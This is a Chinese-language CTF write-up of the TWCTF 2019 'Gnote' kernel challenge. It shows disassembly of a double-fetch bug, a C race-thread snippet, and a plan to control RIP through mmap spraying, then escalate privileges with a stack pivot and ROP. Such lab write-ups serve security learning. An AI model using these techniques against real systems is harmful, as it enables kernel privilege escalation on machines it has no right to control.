# Gnote - TWCTF 2019

有代码，好耶

看源码发现写的很严谨，该加锁的加了锁，该判断的加了判断

看上去有风险的事情，一个是没有通过 copy_from_user 处理输入（这个真的是问题吗。。），因此user input buf可以被设置成一个高位kernel地址，但是后面出现的严格的校验，看上去无法直接出现问题

一个是 kmalloc 出来的内容，没有立即赋值或者清零

因此，必须要逆向ko看一下，把switch和各种函数入参修一修，会发现有double-fetch的问题可以竞争绕过select的判断

# leak && rip

他的启动脚本在 /init 下，修改一下 kptr_restrict 和 setsid cttyhack setuidgid 00 sh 使得我们获得root并看到基址

存在读未初始化的read，leak就有很多种办法了，后面在统计吧，我还是用简单快速的 seq_operations 

控制RIP在于竞争0x19和0x1E的判断和跳转

```
.text:0019 ; 7:   if ( *(_DWORD *)user_buffer <= 5u )
.text:0019                 cmp     dword ptr [rbx], 5
.text:001C                 ja      short def_28    ; jumptable 0028 default case, case 0
.text:001E ; 9:     switch ( (unsigned __int64)note_write_jpt[*(unsigned int *)user_buffer] )
.text:001E                 mov     eax, [rbx]
.text:0020                 mov     rax, ds:note_write_jpt[rax*8]
.text:0028                 jmp     rax             ; switch 5 cases
```

先写一个竞争测试一下

```
unsigned int G_race_buffer[2];
bool G_race_condition = true;
void * race_thread(void * race_data) {
    while(G_race_condition) {
        G_race_buffer[0] = (unsigned long)race_data;
    }
}
.....
{
    //race
    printf("[+] goto race");
    pthread_t thr;
    pthread_create(&thr, 0, race_thread, (void *)0xFFFFFFFF);
    G_race_buffer[0] = 0;
    G_race_buffer[1] = 0;    
    
    for (int i = 0; i < 0x100000; i++) {
        G_race_buffer[0] = 0;
        write(fd, G_race_buffer, sizeof(G_race_buffer));
    }
    G_race_condition = false;
}
```

别人的WP有用汇编写的，的确理论上用汇编的指令更少，竞争频率更高，但是我觉得在这种条件宽松的场景下，差不了多少，不要小看编译器的优化程度，没必要。

相关写法的文档：https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html#InputOperands

上面这样会出现kernel-panic，那么控制RIP到什么地方？题目开了SMEP却没有开SMAP，因此常规的栈迁移再到user-mode rop 是可以实现的

看一下jump-table的计算方法

```
mov     rax, ds:note_write_jpt[rax*8]
jmp     rax
```

题目.ko模块加载地址不是固定的，因此note_write_jpt的地址也不会固定，希望race指定出偏移显然不可行 但是 在KALSR下,kernel-module地址的随机性只有3个BYTE 这里我用Z来表示 0xffffffffc0ZZZ000 大概是20M不到的地址空间，这个地址空间完全可以通过user-mod环境mmap喷射地址实现rip的控制

```
计算可用的喷射地址，我是用静态编译不存在libc占位的问题

那能用的地址从0x2000000 ~ 0x3000000 足够了

      0x400000           0x401000 r--p     1000 0      
      0x401000           0x4af000 r-xp    ae000 1000   
      0x4af000           0x4d9000 r--p    2a000 af000  
      0x4da000           0x4dd000 r--p     3000 d9000  
      0x4dd000           0x4e0000 rw-p     3000 dc000  
      0x4e0000           0x4e6000 rw-p     6000 0      [anon_004e0]
     0x1029000          0x104c000 rw-p    23000 0      [heap]
0x7ffdb5341000     0x7ffdb5362000 rw-p    21000 0      [stack]
0x7ffdb53aa000     0x7ffdb53ad000 r--p     3000 0      [vvar]
0x7ffdb53ad000     0x7ffdb53af000 r-xp     2000 0      [vdso]
```

最后通过一次通用栈迁移+ROP的模板即可实现了，目标是修改mod_probpath, 或者通过ROP执行commit_cred(prepare_kernel_cred(0)) ,这2个差不太多

但是还有一个问题，在我返回user-mode的时候 程序会出现 segment-fault的问题，马上意识到这题开了KPTI，绕过的办法有很多，这里都写到rop了因此注册一个专门的sigment-fault信号处理函数用于解决这个问题。

通过dmesg查看是否开启KPTI
```
dmesg | grep -q "Kernel/User page tables isolation: enabled" \
&& echo "patched :)" || echo "unpatched :("
```

# ref

https://rpis.ec/blog/tokyowesterns-2019-gnote/

https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#gnote